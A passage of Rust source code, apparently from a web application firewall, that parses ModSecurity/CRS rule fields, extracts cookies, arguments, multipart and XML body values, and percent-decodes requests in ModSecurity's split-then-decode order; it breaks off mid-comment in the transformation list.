            "path_length" => Self::PathLength,
            "query_arg_count" => Self::QueryArgCount,
            "headers" => Self::Headers,
            "cookies" => Self::Cookies,
            "header_referer" => Self::HeaderReferer,
            "header_host" => Self::HeaderHost,
            "header_range" => Self::HeaderRange,
            "response_body" => Self::ResponseBody,
            "response_status" => Self::ResponseStatus,
            // Collections evaluated one member at a time. They have no
            // dedicated `Field` variant because the surface bitset already
            // distinguishes GET from POST and names from values, and a rule
            // naming several of them at once must be one field.
            //
            // The `ARGS` family comes from a urlencoded split; `files`,
            // `files_names` and `multipart_part_headers` come from the
            // `multipart/form-data` parser, one value per part (or per part
            // header line).
            "args"
            | "args_get"
            | "args_post"
            | "args_names"
            | "args_get_names"
            | "args_post_names"
            | "cookies_names"
            | "files"
            | "files_names"
            | "multipart_part_headers"
            // `XML:/*` is a single value and `XML://@*` a collection, but both
            // are only populated when the XML body processor ran, so they live
            // in the surface bitset next to the other body-derived surfaces.
            | "xml_text"
            | "xml_attrs" => Self::Multi(Surfaces::parse(name)?),
            // Composite surface list, e.g. `args+cookies`.  Requires a `+` so a
            // single-surface rule keeps using its dedicated field and there is
            // exactly one spelling per meaning.
            multi if multi.contains('+') => Self::Multi(Surfaces::parse(multi)?),
            _ => return None,
        })
    }

    /// Parse a `+` list that contains at least one `header:<name>` token.
    ///
    /// Returns `None` — so the rule is rejected at load time and named in the
    /// startup WARN — for an empty or non-`token` header name, for a name
    /// repeated within the list, and for any non-header token `Surfaces` does
    /// not know. Nothing here falls back to a wider field: a field name that
    /// cannot be read exactly is not read at all.
    fn parse_named(name: &str) -> Option<Self> {
        let mut names: Vec<Box<str>> = Vec::new();
        let mut surface_bits = 0u32;
        for token in name.split('+') {
            let Some(header) = token.strip_prefix(HEADER_TOKEN) else {
                // An ordinary surface sharing the list, e.g. the `files` in
                // CRS-933110.  Parsed one token at a time so an overlap
                // between two of them is still refused.
                let surfaces = Surfaces::parse(token)?;
                if surface_bits & surfaces.0 != 0 {
                    return None;
                }
                surface_bits |= surfaces.0;
                continue;
            };
            if header.is_empty() || !header.bytes().all(is_header_name_byte) {
                return None;
            }
            names.push(header.to_ascii_lowercase().into_boxed_str());
        }
        // Sorting makes the field order-insensitive the way a surface bitset
        // already is, so `files+header:a` and `header:a+files` are one field;
        // the duplicate check rides on the sort.
        names.sort_unstable();
        let before = names.len();
        names.dedup();
        if names.is_empty() || names.len() != before {
            return None;
        }
        Some(Self::Named(NamedHeaders {
            surfaces: Surfaces(surface_bits),
            names: names.into_boxed_slice(),
        }))
    }

    /// `false` for fields that expand to several values; scalar comparisons
    /// (`equals` / `not_in` / `gt` / `lt`) are not meaningful on those.
    ///
    /// One named header on its own *is* a single value — that is what makes
    /// CRS-920520 (`REQUEST_HEADERS:Accept-Encoding "@gt 100"` under
    /// `t:length`) expressible — but a list of them, or one mixed with other
    /// surfaces, is not.
    fn is_scalar(&self) -> bool {
        match self {
            Self::Multi(_) | Self::Headers | Self::Cookies => false,
            Self::Named(named) => named.surfaces.0 == 0 && named.names.len() == 1,
            _ => true,
        }
    }

    /// `true` for the fields that can only be read once the origin has answered.
    ///
    /// This is what decides which pipeline a rule joins: a rule naming one of
    /// these is a `phase:4` rule and is evaluated by [`ResponseCheck`], never by
    /// [`Check`]. Splitting on the field rather than on a declared `phase:` key
    /// keeps the two in agreement by construction — a rule cannot end up in the
    /// request pipeline reading a surface that does not exist there.
    const fn is_response(&self) -> bool {
        matches!(self, Self::ResponseBody | Self::ResponseStatus)
    }

    /// The single value of a scalar field, or `None` for multi-valued fields
    /// and for scalar fields absent from the request.
    fn scalar<'v>(&self, view: &'v RequestView<'_>) -> Option<Cow<'v, str>> {
        let ctx = view.ctx;
        let header = |name: &str| ctx.headers.get(name).map(|v| Cow::Borrowed(v.as_str()));
        match self {
            // A lone named header is the one `Named` shape that is scalar; the
            // rest are answered by `collect_values` / `any_value`.
            Self::Named(named) if self.is_scalar() => named.names.first().and_then(|n| header(n)),
            Self::Method => Some(Cow::Borrowed(ctx.method.as_str())),
            Self::Path => Some(Cow::Borrowed(view.path.as_ref())),
            Self::PathRaw => Some(Cow::Borrowed(ctx.path.as_str())),
            Self::Query => Some(Cow::Borrowed(view.query.as_ref())),
            Self::Body => Some(Cow::Borrowed(view.body.as_ref())),
            Self::ContentLength => Some(Cow::Owned(ctx.content_length.to_string())),
            Self::ContentType => header("content-type"),
            Self::UserAgent => header("user-agent"),
            Self::HeaderReferer => header("referer"),
            // The raw `Host` request header, *not* the matched vhost name —
            // CRS-920350 exists precisely to flag a Host header the site
            // configuration would not have produced.
            Self::HeaderHost => header("host"),
            Self::HeaderRange => header("range"),
            Self::PathLength => Some(Cow::Owned(ctx.path.len().to_string())),
            Self::QueryArgCount => {
                let count = ctx.query.split('&').filter(|s| !s.is_empty()).count();
                Some(Cow::Owned(count.to_string()))
            }
            Self::HeaderCount(name) => Some(Cow::Borrowed(if ctx.headers.contains_key(*name) { "1" } else { "0" })),
            // `None` when the view has no response attached, which is every
            // request-phase evaluation. That is the safety property that makes
            // the split cheap: even if a response rule reached the request
            // pipeline it would read nothing and could not match, rather than
            // matching some unrelated request surface.
            Self::ResponseBody => view.response.as_ref().map(|r| Cow::Borrowed(r.body.as_ref())),
            Self::ResponseStatus => view.response.as_ref().map(|r| Cow::Borrowed(r.status.as_str())),
            Self::Multi(_) | Self::Headers | Self::Cookies | Self::Named(_) => None,
        }
    }

    /// Every value this field expands to, materialised.
    ///
    /// Only chained rules need this: a single-condition rule is answered by
    /// [`Self::any_value`], which short-circuits and allocates nothing.  A
    /// chain has to know *which* values matched so that a later
    /// `matched_value` (`ModSecurity` `MATCHED_VARS`) condition can be applied
    /// to them, so the whole expansion is collected — but only after the head
    /// condition has already matched, so this never runs on ordinary traffic.
    fn collect_values<'v>(&self, view: &'v RequestView<'_>) -> Vec<Cow<'v, str>> {
        let ctx = view.ctx;
        match self {
            Self::Multi(s) => Self::collect_surfaces(*s, view),
            Self::Named(named) => {
                let mut out = Self::collect_surfaces(named.surfaces, view);
                out.extend(
                    named
                        .names
                        .iter()
                        .filter_map(|name| ctx.headers.get(&**name).map(|v| Cow::Borrowed(v.as_str()))),
                );
                out
            }
            Self::Headers => ctx
                .headers
                .iter()
                .flat_map(|(name, value)| [Cow::Borrowed(name.as_str()), Cow::Borrowed(value.as_str())])
                .collect(),
            Self::Cookies => cookie_values(ctx).map(Cow::Borrowed).collect(),
            _ => self.scalar(view).into_iter().collect(),
        }
    }

    /// Materialise every value the surfaces in `s` expand to.
    ///
    /// Split out of [`Self::collect_values`] so [`Self::Named`] can reuse it
    /// verbatim: a rule that names both a surface and a header must read the
    /// surface exactly as a rule that names it alone does.
    fn collect_surfaces<'v>(s: Surfaces, view: &'v RequestView<'_>) -> Vec<Cow<'v, str>> {
        let ctx = view.ctx;
        let mut out: Vec<Cow<'v, str>> = Vec::new();
        let header = |name: &str, out: &mut Vec<Cow<'v, str>>| {
            if let Some(value) = ctx.headers.get(name) {
                out.push(Cow::Borrowed(value.as_str()));
            }
        };
        if s.has(Surfaces::PATH) {
            out.push(Cow::Borrowed(view.path.as_ref()));
        }
        if s.has(Surfaces::PATH_RAW) {
            out.push(Cow::Borrowed(ctx.path.as_str()));
        }
        if s.has(Surfaces::QUERY) {
            out.push(Cow::Borrowed(view.query.as_ref()));
        }
        if view.body_surface_applies(s) {
            out.push(Cow::Borrowed(view.body.as_ref()));
        }
        if s.has(Surfaces::XML_TEXT) && !view.xml().text.is_empty() {
            out.push(Cow::Borrowed(view.xml().text.as_str()));
        }
        if s.has(Surfaces::XML_ATTRS) {
            out.extend(view.xml().attrs.iter().map(|v| Cow::Borrowed(v.as_str())));
        }
        if s.has(Surfaces::ARGS_GET) {
            out.extend(view.args_get().iter().map(|arg| Cow::Borrowed(arg.value.as_str())));
        }
        if s.has(Surfaces::ARGS_GET_NAMES) {
            out.extend(view.args_get().iter().map(|arg| Cow::Borrowed(arg.name.as_str())));
        }
        if s.has(Surfaces::ARGS_POST) {
            out.extend(view.args_post().iter().map(|arg| Cow::Borrowed(arg.value.as_str())));
        }
        if s.has(Surfaces::ARGS_POST_NAMES) {
            out.extend(view.args_post().iter().map(|arg| Cow::Borrowed(arg.name.as_str())));
        }
        if s.has(Surfaces::FILES) {
            out.extend(view.multipart_files());
        }
        if s.has(Surfaces::FILES_NAMES) {
            out.extend(view.multipart_files_names());
        }
        if s.has(Surfaces::MULTIPART_PART_HEADERS) {
            out.extend(view.multipart_part_headers());
        }
        if s.has(Surfaces::COOKIES) {
            out.extend(cookie_values(ctx).map(Cow::Borrowed));
        }
        if s.has(Surfaces::COOKIE_NAMES) {
            out.extend(cookie_names(ctx).map(Cow::Borrowed));
        }
        if s.has(Surfaces::HEADER_VALUES) {
            out.extend(ctx.headers.values().map(|v| Cow::Borrowed(v.as_str())));
        }
        if s.has(Surfaces::USER_AGENT) {
            header("user-agent", &mut out);
        }
        if s.has(Surfaces::REFERER) {
            header("referer", &mut out);
        }
        out
    }

    /// Apply `f` to every value this field expands to, short-circuiting on the
    /// first `true`.
    ///
    /// Values arrive as the request parser produced them; the caller applies
    /// the rule's own `t:` chain on top.
    fn any_value(&self, view: &RequestView<'_>, mut f: impl FnMut(&str) -> bool) -> bool {
        let ctx = view.ctx;
        match self {
            Self::Multi(s) => Self::any_surface(*s, view, &mut f),
            // Named headers are tried after the surfaces so a rule that lists
            // both keeps reading them in the order upstream writes them, and
            // the header map is only probed when no surface answered.
            Self::Named(named) => {
                Self::any_surface(named.surfaces, view, &mut f)
                    || named
                        .names
                        .iter()
                        .any(|name| ctx.headers.get(&**name).is_some_and(|v| f(v)))
            }
            Self::Headers => ctx.headers.iter().any(|(name, value)| f(name) || f(value)),
            Self::Cookies => cookie_values(ctx).any(&mut f),
            _ => self.scalar(view).as_deref().is_some_and(f),
        }
    }

    /// [`Self::any_value`] restricted to the surface bitset — the shared half
    /// of [`Self::Multi`] and [`Self::Named`].
    fn any_surface(s: Surfaces, view: &RequestView<'_>, f: &mut impl FnMut(&str) -> bool) -> bool {
        let ctx = view.ctx;
        let header = |name: &str, f: &mut dyn FnMut(&str) -> bool| ctx.headers.get(name).is_some_and(|v| f(v));
        (s.has(Surfaces::PATH) && f(&view.path))
            || (s.has(Surfaces::PATH_RAW) && f(&ctx.path))
            || (s.has(Surfaces::QUERY) && f(&view.query))
            || (view.body_surface_applies(s) && f(&view.body))
            || (s.has(Surfaces::XML_TEXT) && !view.xml().text.is_empty() && f(&view.xml().text))
            || (s.has(Surfaces::XML_ATTRS) && view.xml().attrs.iter().any(|v| f(v)))
            || (s.has(Surfaces::ARGS_GET) && view.args_get().iter().any(|a| f(&a.value)))
            || (s.has(Surfaces::ARGS_GET_NAMES) && view.args_get().iter().any(|a| f(&a.name)))
            || (s.has(Surfaces::ARGS_POST) && view.args_post().iter().any(|a| f(&a.value)))
            || (s.has(Surfaces::ARGS_POST_NAMES) && view.args_post().iter().any(|a| f(&a.name)))
            || (s.has(Surfaces::FILES) && view.multipart_files().any(|v| f(&v)))
            || (s.has(Surfaces::FILES_NAMES) && view.multipart_files_names().any(|v| f(&v)))
            || (s.has(Surfaces::MULTIPART_PART_HEADERS) && view.multipart_part_headers().any(|v| f(&v)))
            || (s.has(Surfaces::COOKIES) && cookie_values(ctx).any(&mut *f))
            || (s.has(Surfaces::COOKIE_NAMES) && cookie_names(ctx).any(&mut *f))
            || (s.has(Surfaces::HEADER_VALUES) && ctx.headers.values().any(|v| f(v)))
            || (s.has(Surfaces::USER_AGENT) && header("user-agent", &mut *f))
            || (s.has(Surfaces::REFERER) && header("referer", &mut *f))
    }
}

/// `(name, value)` of each cookie in the folded `Cookie` header.
///
/// Neither half is percent-decoded: `ModSecurity` does not decode headers, and
/// the CRS rules that need it attach `t:urlDecodeUni` themselves.
fn cookie_pairs(ctx: &RequestCtx) -> impl Iterator<Item = (&str, &str)> + '_ {
    ctx.headers
        .get("cookie")
        .into_iter()
        .flat_map(|raw| raw.split(';'))
        .map(|pair| {
            let pair = pair.trim();
            pair.split_once('=')
                .map_or((pair, ""), |(name, value)| (name.trim(), value))
        })
}

/// Individual cookie values from the folded `Cookie` header.
fn cookie_values(ctx: &RequestCtx) -> impl Iterator<Item = &str> + '_ {
    cookie_pairs(ctx)
        .map(|(_, value)| value)
        .filter(|value| !value.is_empty())
}

/// Individual cookie names from the folded `Cookie` header
/// (`REQUEST_COOKIES_NAMES`).
fn cookie_names(ctx: &RequestCtx) -> impl Iterator<Item = &str> + '_ {
    cookie_pairs(ctx).map(|(name, _)| name).filter(|name| !name.is_empty())
}

// ── Request view ──────────────────────────────────────────────────────────────

/// One member of the `ARGS` collection, decoded.
///
/// Owned because decoding allocates: the split borrows from the request, but
/// `a%3Db` has to become `a=b` somewhere.  A member whose text needs no
/// decoding still copies — the alternative is a self-referential view, and the
/// copy is bounded by the surface the gateway already capped.
#[derive(Debug, Clone, PartialEq, Eq)]
struct Arg {
    name: String,
    value: String,
}

/// Split a urlencoded surface into `ARGS` members and decode each half.
///
/// The order matters and is `ModSecurity`'s: **split first, decode second**.
/// Decoding the whole surface up front — which is what this engine used to do —
/// turns an encoded `%26` inside a value into a member separator and an encoded
/// `%3D` into a `name=value` split point, so the parameters a rule sees are not
/// the parameters the origin will parse.
fn decode_args(surface: &str) -> Vec<Arg> {
    split_form_args(surface)
        .into_iter()
        .map(|raw| Arg {
            name: percent_decode(raw.name, Plus::IsSpace).into_owned(),
            value: percent_decode(raw.value, Plus::IsSpace).into_owned(),
        })
        .collect()
}

/// `(chain id, value address, value length)` → that chain's output for that
/// value, or `None` when the chain left it alone.
type TransformMemo = HashMap<(u32, usize, usize), Option<Rc<str>>>;

/// The response surfaces, attached to a [`RequestView`] for the response phase.
///
/// Kept as an `Option` on the view rather than as a second view type because a
/// CRS response rule is routinely written against request variables too:
/// upstream `954130` chains `RESPONSE_STATUS "!@rx ^404$"` onto a
/// `RESPONSE_BODY` match, and CRS's own justification for `RESPONSE_STATUS`
/// rules is that a response only means something next to the request that
/// provoked it. The response pipeline therefore needs *both* halves under one
/// lifetime, which is also why [`ResponseCtx`] owns its [`RequestCtx`]. `None`
/// on every request-phase evaluation costs one pointer in a struct that is built
/// once per request.
struct ResponseSurfaces<'a> {
    /// `RESPONSE_STATUS`, rendered once as the string the regexes match.
    status: String,
    /// `RESPONSE_BODY`: one inspection window, lossy UTF-8, undecoded. Borrows
    /// the window when it is already valid UTF-8, which is the common case for
    /// the text media types the gateway admits.
    body: Cow<'a, str>,
}

/// The request as `ModSecurity`'s parser hands it to a rule, built once per
/// request.
///
/// `ModSecurity` does not give CRS the bytes off the wire.  Before any rule
/// runs, its parser percent-decodes the URI into `REQUEST_URI` /
/// `REQUEST_FILENAME` and the query/body into the `ARGS` collection; the `t:`
/// chain a rule declares then runs on *that*.  Reproducing the two steps in the
/// right order is what makes a CRS pattern mean the same thing here as
/// upstream, and doing the first step once per request instead of once per rule
/// is what keeps encoded traffic at the cost of unencoded traffic — 200+ rules
/// share these three strings.
///
/// What is deliberately **not** decoded:
///
/// * `REQUEST_URI_RAW` / `REQUEST_LINE` ([`Field::PathRaw`]) — the surface
///   CRS-920610 and CRS-930100 are written against.
/// * `REQUEST_HEADERS`, including `Cookie` — neither `ModSecurity` v2 nor v3
///   percent-decodes a header or a cookie value; the CRS rules that need it
///   attach `t:urlDecodeUni` themselves (CRS-941100, CRS-941181), and decoding
///   headers unasked is what turns an ordinary `Referer` carrying `%5B0%5D`
///   into CRS-932131's shell construct `/name[index]`.
struct RequestView<'a> {
    ctx: &'a RequestCtx,
    /// The response half, present only in the response phase.
    response: Option<ResponseSurfaces<'a>>,
    /// `REQUEST_URI` / `REQUEST_FILENAME`: percent-decoded.  `+` is left alone
    /// — it is a literal plus in a path, not a space.
    path: Cow<'a, str>,
    /// `QUERY_STRING`: the whole query string, percent- and `+`-decoded in
    /// place.  Per-parameter `ARGS` members come from [`Self::args_get`]
    /// instead.
    query: Cow<'a, str>,
    /// `REQUEST_BODY`: the body preview as lossy UTF-8, then percent- and
    /// `+`-decoded.  A multipart envelope is reduced first to the parts that
    /// are *parameters* — see [`multipart::Multipart::payload_surface`], which
    /// is where the file parts' contents are dropped and why.
    /// Per-parameter `ARGS_POST` members come from [`Self::args_post`].
    body: Cow<'a, str>,
    /// `true` when the request body is `application/x-www-form-urlencoded`, so
    /// [`Self::args_post`] can split it and the whole-`body` surface must stand
    /// aside for the fields that read `ARGS_POST` (see
    /// [`Self::body_surface_applies`]).
    body_is_form: bool,
    /// `XML:/*` and `XML://@*`, from the XML body processor.
    ///
    /// Built on first use and empty for every content type upstream would not
    /// have handed to that processor, which is the whole point of the surface:
    /// a JSON or plain-text body populates no `XML:` variable upstream and
    /// populates none here.
    xml: OnceCell<body_processors::XmlBody>,
    /// `ARGS_GET` / `ARGS_GET_NAMES`, split from the **raw** query string and
    /// then decoded member by member.  Built on first use: a rule set with no
    /// argument rules never pays for it.
    args_get: OnceCell<Vec<Arg>>,
    /// `ARGS_POST` / `ARGS_POST_NAMES`, from whichever body processor upstream
    /// would have selected: the urlencoded split, the non-file parts of a
    /// multipart envelope, or the flattened leaves of a JSON document.  Empty
    /// for a body none of them claims, which upstream leaves to `REQUEST_BODY`.
    args_post: OnceCell<Vec<Arg>>,
    /// The parsed `multipart/form-data` envelope, backing `FILES` /
    /// `FILES_NAMES` / `MULTIPART_PART_HEADERS`.
    ///
    /// `None` when the request is not multipart at all.  Parsed eagerly rather
    /// than on demand because [`Self::body`] is derived from it: a multipart
    /// envelope's `REQUEST_BODY` is its parts' payloads, so the parse happens
    /// once per request either way.
    multipart: Option<Multipart<'a>>,
    /// `(chain id, value address, value length)` → what that chain made of that
    /// value, for the current request.
    ///
    /// Two hundred-odd rules read the same handful of surfaces through 39
    /// distinct chains, so without this the same `t:lowercase` of the same 2 KB
    /// query runs 35 times.  Keying on the address is sound because the only
    /// values memoised are the ones that live for the whole request — the
    /// surfaces owned by this view and the header/cookie text owned by the
    /// context.  Chain links transform short-lived temporaries and take the
    /// uncached path.
    memo: RefCell<TransformMemo>,
}

impl<'a> RequestView<'a> {
    fn new(ctx: &'a RequestCtx) -> Self {
        let content_type = ctx.headers.get("content-type").map(String::as_str);
        let multipart = content_type
            .and_then(multipart_boundary)
            .map(|boundary| multipart::parse(&ctx.body_preview, boundary));
        // A multipart envelope is not `ARGS`, and a file part inside one is not
        // `ARGS` even by approximation; see `Multipart::payload_surface`.
        //
        // The one case that must *not* take that path is an envelope nothing
        // could be parsed out of — a `multipart/form-data` content type over a
        // body that carries no such boundary. Reducing that to its (zero) part
        // payloads would hide every byte of it from every `REQUEST_BODY` rule,
        // which is a bypass and not a parse result, so it falls through to the
        // ordinary whole-body path.
        if let Some(envelope) = &multipart
            && envelope.malformed()
        {
            // Not a rule hit and not an error: an envelope truncated by the
            // inspection window is malformed by this definition too. It is
            // recorded because "the parts a rule saw are not the parts the
            // origin will see" is the one thing an operator chasing either a
            // bypass or a false positive on an upload needs to know first.
            debug!(
                req_id = %ctx.req_id,
                parts = envelope.part_count(),
                "malformed multipart/form-data envelope"
            );
        }
        let body = match &multipart {
            Some(envelope) if !envelope.yielded_nothing() => Cow::Owned(envelope.payload_surface()),
            _ => match String::from_utf8_lossy(&ctx.body_preview) {
                Cow::Borrowed(text) => percent_decode(text, Plus::IsSpace),
                Cow::Owned(text) => Cow::Owned(percent_decoded(&text, Plus::IsSpace).unwrap_or(text)),
            },
        };
        Self {
            ctx,
            response: None,
            path: percent_decode(&ctx.path, Plus::IsLiteral),
            query: percent_decode(&ctx.query, Plus::IsSpace),
            body,
            body_is_form: is_form_urlencoded(content_type),
            xml: OnceCell::new(),
            args_get: OnceCell::new(),
            args_post: OnceCell::new(),
            multipart,
            memo: RefCell::new(TransformMemo::new()),
        }
    }

    /// The XML body processor's output, parsed at most once per request and
    /// only for a `Content-Type` upstream would have routed to it.
    fn xml(&self) -> &body_processors::XmlBody {
        self.xml.get_or_init(|| {
            let content_type = self.ctx.headers.get("content-type").map(String::as_str);
            if body_processors::is_xml_content_type(content_type) {
                body_processors::parse_xml(&self.ctx.body_preview)
            } else {
                body_processors::XmlBody::default()
            }
        })
    }

    /// `FILES`: the file name of every `multipart/form-data` file part.
    fn multipart_files(&self) -> impl Iterator<Item = Cow<'a, str>> {
        self.multipart.iter().flat_map(Multipart::files)
    }

    /// `FILES_NAMES`: the form field name of every file part.
    fn multipart_files_names(&self) -> impl Iterator<Item = Cow<'a, str>> {
        self.multipart.iter().flat_map(Multipart::files_names)
    }

    /// `MULTIPART_PART_HEADERS`: every part's header lines, one value per line.
    fn multipart_part_headers(&self) -> impl Iterator<Item = Cow<'a, str>> {
        self.multipart.iter().flat_map(Multipart::part_headers)
    }

    /// The same view, plus the response surfaces of `response`.
    ///
    /// The request half is built exactly as the request phase built it, so a
    /// response rule that also reads a request variable sees the identical
    /// normalisation — that is the whole reason [`ResponseCtx`] owns its
    /// `RequestCtx`.
    fn for_response(response: &'a ResponseCtx) -> Self {
        let mut view = Self::new(&response.request);
        view.response = Some(ResponseSurfaces {
            status: response.status.to_string(),
            body: String::from_utf8_lossy(&response.body_preview),
        });
        view
    }

    /// `ARGS_GET`: the query string's parameters, split then decoded.
    fn args_get(&self) -> &[Arg] {
        self.args_get.get_or_init(|| decode_args(&self.ctx.query))
    }

    /// `ARGS_POST`: the body's parameters, as the body processor upstream would
    /// have selected produces them.
    ///
    /// Three processors populate this collection upstream and all three do so
    /// here — see [`body_processors`] for the selection table. The dispatch
    /// order is the order `ModSecurity` resolves it in: a `multipart/form-data`
    /// content type is never also a urlencoded one, and rule 200001's JSON
    /// processor only ever sees what neither of the built-in two claimed.
    ///
    /// A body no processor claims contributes nothing here, which is exactly
    /// when upstream's CRS-901340 forces `REQUEST_BODY` instead — the surface
    /// [`Self::body`] carries.
    fn args_post(&self) -> &[Arg] {
        self.args_post.get_or_init(|| {
            if let Some(envelope) = &self.multipart {
                return envelope
                    .form_args()
                    .map(|(name, value)| Arg {
                        name: name.into_owned(),
                        value: value.into_owned(),
                    })
                    .collect();
            }
            if self.body_is_form {
                return decode_args(&String::from_utf8_lossy(&self.ctx.body_preview));
            }
            let content_type = self.ctx.headers.get("content-type").map(String::as_str);
            if body_processors::is_json_content_type(content_type) {
                return body_processors::json_args(&self.ctx.body_preview)
                    .into_iter()
                    .map(|(name, value)| Arg { name, value })
                    .collect();
            }
            Vec::new()
        })
    }

    /// Whether the whole-`body` surface contributes a value for the field
    /// described by `surfaces`.
    ///
    /// It normally does.  The one exception is a **urlencoded body read by a
    /// field that also names `ARGS_POST`**: the parameter members already carry
    /// every byte of that body, and handing the same bytes over a second time
    /// as one blob re-creates exactly the cross-parameter matching this whole
    /// change removes — a `tab=tab` form post would satisfy CRS-942130's
    /// `word = word` tautology test through the blob while the split members
    /// correctly do not.
    ///
    /// The exception is deliberately **not** extended to the JSON and multipart
    /// processors, even though they now populate `ARGS_POST` too. After the
    /// `XML:/*` mis-mapping was undone, the only rules still carrying the
    /// `body` bit are the thirteen that name `REQUEST_BODY` upstream plus the
    /// handful whose variable list really is the whole request (`all`), and
    /// narrowing what *those* see is a separate decision with its own
    /// evidence — not a side effect of fixing the XML surface.
    const fn body_surface_applies(&self, surfaces: Surfaces) -> bool {
        surfaces.has(Surfaces::BODY) && !(self.body_is_form && surfaces.has(Surfaces::ARGS_POST))
    }

    /// `value` with `chain` applied, reusing this request's earlier answer for
    /// the same chain and the same value.
    ///
    /// `None` means the chain left the value alone, which is the answer for an
    /// identity chain and for the many chains that are no-ops on ordinary
    /// traffic — the caller then matches against `value` itself and nothing is
    /// allocated at all.
    fn transformed(&self, chain: &TransformChain, value: &str) -> Option<Rc<str>> {
        if chain.is_identity() {
            return None;
        }
        if chain.id == TransformChain::UNINTERNED {
            return chain.apply(value).map(Rc::from);
        }
        let key = (chain.id, value.as_ptr() as usize, value.len());
        if let Some(hit) = self.memo.borrow().get(&key) {
            return hit.clone();
        }
        let produced = chain.apply(value).map(Rc::from);
        self.memo.borrow_mut().insert(key, produced.clone());
        produced
    }
}

/// The `boundary=` parameter of a `multipart/*` content type.
fn multipart_boundary(content_type: &str) -> Option<&str> {
    let lower = content_type.to_ascii_lowercase();
    if !lower.trim_start().starts_with("multipart/") {
        return None;
    }
    let at = lower.find("boundary=")?;
    let rest = content_type.get(at.saturating_add("boundary=".len())..)?;
    let value = rest.split(';').next().unwrap_or(rest).trim();
    let value = value
        .strip_prefix('"')
        .and_then(|inner| inner.strip_suffix('"'))
        .unwrap_or(value);
    (!value.is_empty()).then_some(value)
}

/// Whether `+` decodes to a space on the surface being decoded.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Plus {
    /// Form encoding (query string, urlencoded body).
    IsSpace,
    /// Path components, where `+` is an ordinary character.
    IsLiteral,
}

/// `true` when `bytes` holds `first` or `second`, scanned a word at a time.
///
/// Every transformation is fronted by a "can this possibly change anything"
/// test, and on a clean request that test *is* the cost: 133 of the shipped
/// conditions carry `t:urlDecodeUni` and each one asks whether a 2 KB query
/// holds a `%`.  A plain `bytes().any(..)` loop measured ~125 us per pass on
/// that input — more than the CRS regexes the guard exists to skip.
///
/// Pass the same byte twice to look for one marker.
fn contains_marker(bytes: &[u8], first: u8, second: u8) -> bool {
    /// `0x01` in every byte lane.
    const ONES: u64 = u64::from_ne_bytes([0x01; 8]);
    /// `0x80` in every byte lane.
    const HIGHS: u64 = u64::from_ne_bytes([0x80; 8]);

    /// `true` when any byte lane of `word` is zero.
    ///
    /// Borrowing a `1` out of the lane above sets that lane's high bit exactly
    /// when the lane was zero; `& !word` discards lanes that were already
    /// >= 0x80 and merely borrowed.  Exact — no false positives.
    const fn has_zero_lane(word: u64) -> bool {
        word.wrapping_sub(ONES) & !word & HIGHS != 0
    }

    let firsts = u64::from_ne_bytes([first; 8]);
    let seconds = u64::from_ne_bytes([second; 8]);
    let mut chunks = bytes.chunks_exact(8);
    for chunk in &mut chunks {
        let Ok(lanes) = <[u8; 8]>::try_from(chunk) else {
            // `chunks_exact(8)` yields nothing but 8-byte chunks; fall back to
            // the byte scan rather than assume it.
            return bytes.iter().any(|&b| b == first || b == second);
        };
        let word = u64::from_ne_bytes(lanes);
        if has_zero_lane(word ^ firsts) || has_zero_lane(word ^ seconds) {
            return true;
        }
    }
    chunks.remainder().iter().any(|&b| b == first || b == second)
}

/// `true` when percent-decoding `bytes` could possibly change them.
///
/// `%` starts an escape and `+` is the form-encoded space; a value holding
/// neither is its own decoded form, so the caller can skip the decode and the
/// allocation it needs.
fn may_be_encoded(bytes: &[u8]) -> bool {
    contains_marker(bytes, b'%', b'+')
}

/// Percent-decode `input`, returning `None` when nothing changed.
///
/// Non-strict, as `ModSecurity`'s parser is: a `%` that does not introduce two
/// hex digits is kept verbatim rather than rejecting the request.
fn percent_decoded(input: &str, plus: Plus) -> Option<String> {
    let bytes = input.as_bytes();
    if !may_be_encoded(bytes) {
        return None;
    }
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut i = 0usize;
    while let Some(&b) = bytes.get(i) {
        if b == b'%'
            && let (Some(hi), Some(lo)) = (
                bytes.get(i + 1).copied().and_then(hex_value),
                bytes.get(i + 2).copied().and_then(hex_value),
            )
        {
            out.push(hi * 16 + lo);
            i += 3;
            continue;
        }
        if b == b'+' && plus == Plus::IsSpace {
            out.push(b' ');
        } else {
            out.push(b);
        }
        i += 1;
    }
    (out.as_slice() != bytes).then(|| String::from_utf8_lossy(&out).into_owned())
}

/// Percent-decode `input`, borrowing when nothing changed.
fn percent_decode(input: &str, plus: Plus) -> Cow<'_, str> {
    percent_decoded(input, plus).map_or(Cow::Borrowed(input), Cow::Owned)
}

/// Numeric value of one ASCII hex digit.
const fn hex_value(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

// ── ModSecurity transformations ───────────────────────────────────────────────

/// One `ModSecurity` `t:` transformation.
///
/// A CRS pattern is written against the *output* of the rule's transformation
/// chain, so the chain is part of the rule, not an optimisation: CRS-944120's
/// pattern is `invokertransformer` in lower case and only ever matches real
/// traffic because `t:lowercase` ran first, while CRS-920230's `%[0-9a-fA-F]{2}`
/// only means "double encoding" because *no* transformation ran.  A
/// transformation this engine cannot perform therefore rejects the rule
/// ([`RejectReason::UnsupportedTransformation`]) rather than being skipped.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
enum Transform {
    Lowercase,
    UrlDecodeUni,
    HtmlEntityDecode,
    JsDecode,
    CssDecode,
    EscapeSeqDecode,
    Utf8ToUnicode,
    RemoveNulls,
    RemoveWhitespace,
    CompressWhitespace,
    ReplaceComments,
    RemoveCommentsChar,
    NormalizePath,
    NormalizePathWin,
    CmdLine,
    Base64Decode,
    Length,
}

/// Whitespace as `ModSecurity`'s whitespace transformations define it — the
/// ASCII set plus the Latin-1 non-breaking space.
const fn is_modsec_space(b: u8) -> bool {
    matches!(b, b' ' | b'\t' | b'\n' | b'\r' | 0x0b | 0x0c | 0xa0)
}

impl Transform {
    /// Resolve a `ModSecurity` transformation name.  Case-insensitive, as the
    /// `SecRule` parser is.
    fn parse(name: &str) -> Option<Self> {
        Some(match name.trim().to_ascii_lowercase().as_str() {
            // `t:none` clears the chain and is applied by the converter, so it
            // never reaches the engine as a step of its own.
            "lowercase" => Self::Lowercase,
            // `t:urlDecode` is `t:urlDecodeUni` minus the `%uXXXX` form.  CRS
            // v4.25.0 uses only the latter; the plain spelling is accepted so a
            // hand-written rule can ask for it, and resolves to the same step —
            // percent decoding is identical and no CRS pattern distinguishes a
